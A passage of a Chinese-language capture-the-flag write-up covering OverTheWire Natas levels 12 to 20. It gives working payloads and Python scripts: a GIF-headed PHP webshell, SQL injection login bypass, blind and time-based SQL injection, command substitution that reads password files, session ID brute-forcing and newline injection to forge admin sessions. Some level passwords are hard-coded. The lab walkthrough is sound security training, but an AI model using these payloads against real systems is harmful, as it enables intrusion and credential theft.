style=color:#a6e22e>error</span> <span style=color:#a6e22e>uploading</span> <span style=color:#a6e22e>the</span> <span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>please</span> <span style=color:#66d9ef>try</span> <span style=color:#a6e22e>again</span><span style=color:#f92672>!</span><span style=color:#e6db74>&#34;;        }    }} 
+</span></code></pre></div><p>可以看到，最关键的就是多了一个 exif_imagetype 函数，这个函数的作用是读取一个图像的第一个字节并检查其签名。 也就是说，这次会检查我们上传的第一个字节并检查其是否是图片类型，那也简单，同上一题的方法，只不过在文件前加上图片类型的文件头即可：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>GIF89</span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>phpsystem</span>(<span style=color:#e6db74>&#34;cat /etc/natas_webpass/natas14&#34;</span>);<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>同样的方法上传即可。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas13.png alt=natas13></p>
+<h2 id=level-13-14>Level 13->14:</h2>
+<p>这次不是上传文件了，要求登录：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;username&#34;</span>, $_REQUEST)) {    $link <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_connect</span>(<span style=color:#e6db74>&#39;localhost&#39;</span>, <span style=color:#e6db74>&#39;natas14&#39;</span>, <span style=color:#e6db74>&#39;&lt;censored&gt;&#39;</span>);    <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#e6db74>&#39;natas14&#39;</span>, $link);        $query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * from users where username=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>$_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> and password=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>$_REQUEST[<span style=color:#e6db74>&#34;password&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>;    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;debug&#34;</span>, $_GET)) {        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Executing query: </span><span style=color:#e6db74>$query</span><span style=color:#e6db74>&lt;br&gt;&#34;</span>;    }    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysql_num_rows</span>(<span style=color:#a6e22e>mysql_query</span>($query, $link)) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&#34;</span>;    } <span style=color:#66d9ef>else</span> {            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Access denied!&lt;br&gt;&#34;</span>;    }    <span style=color:#a6e22e>mysql_close</span>($link);}
+</code></pre></div><p>连接 mysql 数据库，查询，应该是 sql注入了。登陆成功后会返回密码，那就直接万能密码了 <code>" or 1 #</code>，直接返回密码。</p>
+<h2 id=level-14-15>Level 14->15:</h2>
+<p>仍然是输入框，检查用户是否存在。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;username&#34;</span>, $_REQUEST)) {
+    $link <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_connect</span>(<span style=color:#e6db74>&#39;localhost&#39;</span>, <span style=color:#e6db74>&#39;natas15&#39;</span>, <span style=color:#e6db74>&#39;&lt;censored&gt;&#39;</span>);
+    <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#e6db74>&#39;natas15&#39;</span>, $link);
+    
+    $query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * from users where username=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>$_REQUEST[<span style=color:#e6db74>&#34;username&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>&#34;</span>;
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;debug&#34;</span>, $_GET)) {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Executing query: </span><span style=color:#e6db74>$query</span><span style=color:#e6db74>&lt;br&gt;&#34;</span>;
+    }
+
+    $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($query, $link);
+    <span style=color:#66d9ef>if</span>($res) {
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysql_num_rows</span>($res) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;This user exists.&lt;br&gt;&#34;</span>;
+    } <span style=color:#66d9ef>else</span> {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;This user doesn&#39;t exist.&lt;br&gt;&#34;</span>;
+    }
+    } <span style=color:#66d9ef>else</span> {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Error in query.&lt;br&gt;&#34;</span>;
+    }
+
+    <span style=color:#a6e22e>mysql_close</span>($link);
+} 
+</code></pre></div><p>这次仅返回存在或不存在，那么应该是盲注了。
+先看看密码多长（根据经验为32位）：<code>natas16" and length(password)=32 #</code>。返回了<strong>This user exists.</strong>，也就是true，接下来就是猜解密码了。
+仍然是根据经验，密码为大小写字母和数字的组合，那就用 sqlmap 或者脚本呗。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e># Natas15</span>
+
+<span style=color:#f92672>import</span> requests
+<span style=color:#f92672>from</span> requests.auth <span style=color:#f92672>import</span> HTTPBasicAuth
+
+url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://natas15.natas.labs.overthewire.org/index.php&#34;</span>
+passkey <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;This user exists&#34;</span>
+p_auth<span style=color:#f92672>=</span>HTTPBasicAuth(<span style=color:#e6db74>&#39;natas15&#39;</span>, <span style=color:#e6db74>&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span>)
+passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+
+
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range (<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>33</span>):
+	i_min <span style=color:#f92672>=</span> <span style=color:#ae81ff>48</span>
+	i_max <span style=color:#f92672>=</span> <span style=color:#ae81ff>122</span>
+	<span style=color:#66d9ef>while</span> abs(i_max<span style=color:#f92672>-</span>i_min)<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>1</span>:
+		mid <span style=color:#f92672>=</span> int((i_max<span style=color:#f92672>+</span>i_min)<span style=color:#f92672>/</span><span style=color:#ae81ff>2</span>)
+		p_data<span style=color:#f92672>=</span>{
+			<span style=color:#e6db74>&#39;username&#39;</span>: <span style=color:#e6db74>&#39;natas16&#34; and ascii(substr(password,&#39;</span><span style=color:#f92672>+</span>str(i)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;,1))&gt;&#39;</span><span style=color:#f92672>+</span>str(mid)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39; -- &#39;</span>
+		}	
+		res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url,data<span style=color:#f92672>=</span>p_data,auth<span style=color:#f92672>=</span>p_auth)
+		<span style=color:#66d9ef>if</span> res<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>find(passkey)<span style=color:#f92672>!=-</span><span style=color:#ae81ff>1</span> :
+			i_min <span style=color:#f92672>=</span> mid
+		<span style=color:#66d9ef>else</span>:
+			i_max <span style=color:#f92672>=</span> mid
+	passwd <span style=color:#f92672>+=</span> chr(i_max)
+	print(<span style=color:#e6db74>&#34;Crack Password: &#34;</span><span style=color:#f92672>+</span>passwd)
+</code></pre></div><p>然后就可以爆破出密码(这里网络原因很有可能会出现失败情况）。</p>
+<h2 id=level-15-16>Level 15->16:</h2>
+<p>和前面几道命令注入的一样，但是提示有一些过滤。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>if</span>($key <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) {
+    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[;|&amp;`\&#39;&#34;]/&#39;</span>,$key)) {
+        <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Input contains an illegal character!&#34;</span>;
+    } <span style=color:#66d9ef>else</span> {
+        <span style=color:#a6e22e>passthru</span>(<span style=color:#e6db74>&#34;grep -i </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>$key\</span><span style=color:#e6db74>&#34;</span> <span style=color:#a6e22e>dictionary</span><span style=color:#f92672>.</span><span style=color:#a6e22e>txt</span><span style=color:#e6db74>&#34;);
+</span><span style=color:#e6db74>    }
+</span><span style=color:#e6db74>}
+</span></code></pre></div><p>可以看到这里过滤了几个字符，而且 key 也被加上了双引号，那就没办法用之前的思路了。但是注意到双引号是可以执行命令的，所以先尝试一下：
+<code>$(echo ab)</code>
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas16.png alt=natas16>
+可以看到是可以执行的，但是最终仍然是查询字典。那该怎么利用呢？考虑上题盲注的思路，我们先选取一个字典中的字符串，如<strong>Africans</strong>，在其后加上任何字符都不会返回结果，然后我们可以爆破 <em>/etc/natas_webpass/natas17</em> 这个文件，将其组合，根据是否返回内容来判断是否正确，构造这样的 payload：
+<code>Africans$(grep ^char /etc/natas_webpass/natas17)</code>
+写出脚本：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e># Natas16</span>
+
+<span style=color:#f92672>import</span> requests
+<span style=color:#f92672>from</span> requests.auth <span style=color:#f92672>import</span> HTTPBasicAuth
+
+url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://natas16.natas.labs.overthewire.org/index.php?needle=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span>
+passkey <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Africans&#34;</span>
+p_auth<span style=color:#f92672>=</span>HTTPBasicAuth(<span style=color:#e6db74>&#39;natas16&#39;</span>, <span style=color:#e6db74>&#39;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#39;</span>)
+passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+dic <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#39;</span>
+
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range (<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>32</span>):
+	<span style=color:#66d9ef>for</span> key <span style=color:#f92672>in</span> dic:
+		payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Africans$(grep ^&#39;</span><span style=color:#f92672>+</span>passwd<span style=color:#f92672>+</span>key<span style=color:#f92672>+</span> <span style=color:#e6db74>&#39; /etc/natas_webpass/natas17)&#39;</span>
+		res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>%</span>payload, auth<span style=color:#f92672>=</span>p_auth)
+		<span style=color:#66d9ef>if</span> res<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;Africans&#39;</span>)<span style=color:#f92672>==-</span><span style=color:#ae81ff>1</span>:
+			passwd<span style=color:#f92672>+=</span>key
+	print(<span style=color:#e6db74>&#34;Crack password:&#34;</span><span style=color:#f92672>+</span>passwd)	
+</code></pre></div><p>可以预见，这次的时间更长，但是可以爆破出密码。</p>
+<h2 id=level-16-17>Level 16->17:</h2>
+<p>检查是否存在用户，应该是和前面的盲注一样增加了之类的，但是看了一下源码，发现并不是过滤，而是将返回内容都注释掉了：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>  <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysql_num_rows</span>($res) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {       <span style=color:#75715e>//echo &#34;This user exists.&lt;br&gt;&#34;;   } else {       //echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;   }   } else {       //echo &#34;Error in query.&lt;br&gt;&#34;;   }
+</span></code></pre></div><p>那就能使用返回内容来判断了，推测应该是时间盲注，脚本还是类似。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e># Natas17import timeimport requestsfrom requests.auth import HTTPBasicAuthurl=&#34;http://natas17.natas.labs.overthewire.org/index.php&#34;passkey = &#34;This user exists&#34;p_auth=HTTPBasicAuth(&#39;natas17&#39;, &#39;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#39;)passwd = &#39;&#39;for i in range (1,33):	i_min = 48	i_max = 122	while abs(i_max-i_min)&gt;1:		mid = int((i_max+i_min)/2)		p_data={			&#39;username&#39;: &#39;natas18&#34; AND ascii(substr(password,&#39;+str(i)+&#39;,1))&gt;&#39;+str(mid)+&#39; AND sleep(3) -- &#39;		}			start = time.time()		res = requests.post(url,data=p_data,auth=p_auth)		if (time.time()-start)&gt;3:			i_min = mid		else:			i_max = mid	passwd += chr(i_max)	print(&#34;Crack Password: &#34;+passwd)</span>
+</code></pre></div><h1 id=level-17>Level 17~</h1>
+<h2 id=level-17-18>Level 17->18:</h2>
+<p>提示以管理员账户登录来找回 natas19 的密码，但是直接以 admin 登录没有什么用似乎，查看一下源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>$maxid <span style=color:#f92672>=</span> <span style=color:#ae81ff>640</span>; <span style=color:#75715e>// 640 should be enough for everyonefunction isValidAdminLogin() {    if($_REQUEST[&#34;username&#34;] == &#34;admin&#34;) {        //return 1;    }    return 0;}function isValidID($id) {     return is_numeric($id);}function createID($user) {     global $maxid;    return rand(1, $maxid);}function debug($msg) {    if(array_key_exists(&#34;debug&#34;, $_GET)) {        print &#34;DEBUG: $msg&lt;br&gt;&#34;;    }}function my_session_start() {     if(array_key_exists(&#34;PHPSESSID&#34;, $_COOKIE) and isValidID($_COOKIE[&#34;PHPSESSID&#34;])) {        if(!session_start()) {            debug(&#34;Session start failed&#34;);            return false;        } else {            debug(&#34;Session start ok&#34;);            if(!array_key_exists(&#34;admin&#34;, $_SESSION)) {                debug(&#34;Session was old: admin flag set&#34;);                $_SESSION[&#34;admin&#34;] = 0; // backwards compatible, secure            }            return true;        }    }    return false;}function print_credentials() {    if($_SESSION and array_key_exists(&#34;admin&#34;, $_SESSION) and $_SESSION[&#34;admin&#34;] == 1) {        print &#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;;        print &#34;&lt;pre&gt;Username: natas19\n&#34;;        print &#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;;    } else {        print &#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&#34;;    }}if(my_session_start()) {    print_credentials();    $showform = false;} else {    if(array_key_exists(&#34;username&#34;, $_REQUEST) &amp;&amp; array_key_exists(&#34;password&#34;, $_REQUEST)) {    session_id(createID($_REQUEST[&#34;username&#34;]));    session_start();    $_SESSION[&#34;admin&#34;] = isValidAdminLogin();    debug(&#34;New session started&#34;);    $showform = false;    print_credentials();    }} ?&gt;
+</span></code></pre></div><p>大致看过之后可以得出应该是根据 SESSION（这里是 PHPSESSID） 来判断的，尝试了几个特别的之后都没有以 admin 登录，那就尝试一下爆破。这里直接使用 BP 抓包爆破。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas18.png alt=natas18>
+可以看到，当 ID=119 时返回长度不同，查看响应包即可找到密码。
+或者使用脚本也可以：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e># Natas 18import requestsfrom requests.auth import HTTPBasicAuthurl=&#34;http://natas18.natas.labs.overthewire.org/index.php&#34;passkey = &#34;You are logged in as a regular user&#34;p_auth=HTTPBasicAuth(&#39;natas18&#39;, &#39;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#39;)for i in range (0,640):	header={ &#34;Cookie&#34;: &#34;__utmc=176859643; __utmz=176859643.1585228692.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=&#34;+str(i)+&#34;; __utma=176859643.1680580650.1585228692.1585296234.1585300065.7&#34; }	res = requests.get(url,headers=header,auth=p_auth)	if res.text.find(passkey)==-1:		print(&#34;ID Found! ID is &#34;+str(i))	else:		print(str(i)+&#34; is not correct.&#34;)</span>
+</code></pre></div><p><img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas18-2.png alt=natas18-2></p>
+<h2 id=level-18-19>Level 18->19:</h2>
+<p>提示和上一题一样，但是 PHPSESSID 不是顺序了（所以上一题其实可以缩小范围），但是对我们的方法没什么影响。但是随便试一下，看到返回的头 <strong>Set-Cookie: PHPSESSID=3238362d61; path=/; HttpOnly</strong> 时，这个数字有点大，那么应该不能是直接就爆破的。</p>
+<p>多次抓包之后发现，只要输入的不变，最后几位就不会变，只有前面变，那么应该是对我们的输入进行编码后返回了。测试注意到返回的数字中有 d 和其他不超过 f 的字母，那么就是说实际是十六进制的一串数字，那么就先考虑吧是不是十六进制编码。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas19.png alt=natas19>
+可以看出，是将一个 ID+username 进行十六进制编码得到的，那么将上题的脚本稍微改一下就行了。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e># Natas 18import requestsfrom requests.auth import HTTPBasicAuthurl=&#34;http://natas19.natas.labs.overthewire.org/index.php&#34;passkey = &#34;You are logged in as a regular user&#34;p_auth=HTTPBasicAuth(&#39;natas19&#39;, &#39;4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs&#39;)for i in range (270,640):	header={ &#34;Cookie&#34;: &#34;__utmc=176859643; __utmz=176859643.1585228692.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=176859643.1680580650.1585228692.1585296234.1585300065.7; PHPSESSID=&#34;+(str(i)+&#39;-admin&#39;).encode(&#34;utf-8&#34;).hex() }	res = requests.get(url,headers=header,auth=p_auth)	if res.text.find(passkey)==-1:		print(&#34;ID Found! ID is &#34;+str(i))		print(res.text)		break	else:		print(str(i)+&#34; is not correct.&#34;)</span>
+</code></pre></div><p><img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas19-2.png alt=natas19-2></p>
+<h2 id=level-19-20>Level 19->20:</h2>
+<p>表面看起来还是和之前的几个一样，但是这次又给出了源码，先看看：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>print_credentials</span>() { <span style=color:#75715e>/* {{{ */</span>    <span style=color:#66d9ef>if</span>($_SESSION <span style=color:#66d9ef>and</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;admin&#34;</span>, $_SESSION) <span style=color:#66d9ef>and</span> $_SESSION[<span style=color:#e6db74>&#34;admin&#34;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;</span>;    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;&lt;pre&gt;Username: natas21</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span>;    } <span style=color:#66d9ef>else</span> {    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&#34;</span>;    }}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>myread</span>($sid) {     <span style=color:#a6e22e>debug</span>(<span style=color:#e6db74>&#34;MYREAD </span><span style=color:#e6db74>$sid</span><span style=color:#e6db74>&#34;</span>);     <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strspn</span>($sid, <span style=color:#e6db74>&#34;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#a6e22e>strlen</span>($sid)) {    <span style=color:#a6e22e>debug</span>(<span style=color:#e6db74>&#34;Invalid SID&#34;</span>);         <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>;    }    $filename <span style=color:#f92672>=</span> <span style=color:#a6e22e>session_save_path</span>() <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;/&#34;</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;mysess_&#34;</span> <span style=color:#f92672>.</span> $sid;    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>file_exists</span>($filename)) {        <span style=color:#a6e22e>debug</span>(<span style=color:#e6db74>&#34;Session file doesn&#39;t exist&#34;</span>);        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>;    }    <span style=color:#a6e22e>debug</span>(<span style=color:#e6db74>&#34;Reading from &#34;</span><span style=color:#f92672>.</span> $filename);    $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($filename);    $_SESSION <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();    <span style=color:#66d9ef>foreach</span>(<span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, $data) <span style=color:#66d9ef>as</span> $line) {        <span style=color:#a6e22e>debug</span>(<span style=color:#e6db74>&#34;Read [</span><span style=color:#e6db74>$line</span><span style=color:#e6db74>]&#34;</span>);    $parts <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34; &#34;</span>, $line, <span style=color:#ae81ff>2</span>);    <span style=color:#66d9ef>if</span>($parts[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) $_SESSION[$parts[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> $parts[<span style=color:#ae81ff>1</span>];    }    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>session_encode</span>();}<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>mywrite</span>($sid, $data) {     <span style=color:#75715e>// $data contains the serialized version of $_SESSION    // but our encoding is better    debug(&#34;MYWRITE $sid $data&#34;);     // make sure the sid is alnum only!!    if(strspn($sid, &#34;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&#34;) != strlen($sid)) {    debug(&#34;Invalid SID&#34;);         return;    }    $filename = session_save_path() . &#34;/&#34; . &#34;mysess_&#34; . $sid;    $data = &#34;&#34;;    debug(&#34;Saving in &#34;. $filename);    ksort($_SESSION);    foreach($_SESSION as $key =&gt; $value) {        debug(&#34;$key =&gt; $value&#34;);        $data .= &#34;$key $value\n&#34;;    }    file_put_contents($filename, $data);    chmod($filename, 0600);}
+</span></code></pre></div><p>其他函数和之前类似或没有作用，主要关注的时在这三个函数。从第一个函数 <code>print_credentials</code>可以看出，如果满足 SESSION 中有 <strong>admin</strong> 并且值为1的时候就能返回密码。从 <code>myread</code> 能看出 <strong>session</strong> 是被保存在一个文件中的，这个文件是与我们的 <strong>sid</strong> 相对应的，也就是与用户相对应的。
+所以，我们要么是伪造 admin 的 <em>sid</em> ，访问 admin 的文件；要么就是在自己的文件中添加上 admin 这一个信息。
+尝试猜解 <em>sid</em> 组成失败后，转向第二种思路，从 <strong>myread</strong> 文件可以看到：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>    $_SESSION <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();    <span style=color:#66d9ef>foreach</span>(<span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, $data) <span style=color:#66d9ef>as</span> $line) {        <span style=color:#a6e22e>debug</span>(<span style=color:#e6db74>&#34;Read [</span><span style=color:#e6db74>$line</span><span style=color:#e6db74>]&#34;</span>);    $parts <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34; &#34;</span>, $line, <span style=color:#ae81ff>2</span>);    <span style=color:#66d9ef>if</span>($parts[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span>) $_SESSION[$parts[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> $parts[<span style=color:#ae81ff>1</span>];    }
+</code></pre></div><p><em>session</em> 是以行为划分的一个数组，如果我们能设法添加一行 <code>admin 1</code>这样的信息，就可以满足条件了。而输入的 name 也是作为键值保存在这个文件里的。座椅，如果我们在输入的名称中构造出<code> username \n admin 1</code>这样的形式，就可以了。
+因此，构造payload：
+<code>http://natas20.natas.labs.overthewire.org/index.php?name=user%0Aadmin%201</code>
+之后重新访问就能得到密码。
+<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/natas/natas20.png alt=natas20></p>
+<h2 id=level-20-21>Level 20->21:</h2>
+<p>进入之后提示这个页面是与了另一个网页搭配的，然后先看看这一页的源码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>print_credentials</span>() { <span style=color:#75715e>/* {{{ */</span>
+    <span style=color:#66d9ef>if</span>($_SESSION <span style=color:#66d9ef>and</span> <span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;admin&#34;</span>, $_SESSION) <span style=color:#66d9ef>and</span> $_SESSION[<span style=color:#e6db74>&#34;admin&#34;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) {
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;You are an admin. The credentials for the next level are:&lt;br&gt;&#34;</span>;
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;&lt;pre&gt;Username: natas22</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;Password: &lt;censored&gt;&lt;/pre&gt;&#34;</span>;
+    } <span style=color:#66d9ef>else</span> {
+    <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&#34;</span>;
+    }
+}
+<span style=color:#75715e>/* }}} */</span>
+
+<span style=color:#a6e22e>session_start</span>();
+<span style=color:#a6e22e>print_credentials</span>();
+
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>仍然是判断 <em>session</em> ，但是其他的操作都没有在这里；那就看看另一个网页：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span>  
+
+<span style=color:#a6e22e>session_start</span>();
+
+<span style=color:#75715e>// if update was submitted, store it
+</span><span style=color:#75715e></span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>array_key_exists</span>(<span style=color:#e6db74>&#34;submit&#34;</span>, $_REQUEST)) {
